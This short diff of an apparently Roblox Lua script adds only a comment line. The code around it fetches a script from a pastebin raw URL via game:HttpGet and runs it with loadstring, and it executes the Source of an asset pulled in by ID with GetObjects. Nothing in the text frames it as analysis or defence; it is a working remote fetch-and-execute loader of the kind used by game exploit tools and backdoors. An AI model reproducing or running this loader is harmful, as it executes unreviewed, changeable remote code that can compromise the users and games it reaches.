@@ -3,7 +3,7 @@ local function load(str)
     loadstring(game:HttpGet((str),true))()
   end)()
 end
-
+-- hh
 load("https://pastebin.com/raw/n88ttmFh")
 coroutine.wrap(function()
   loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
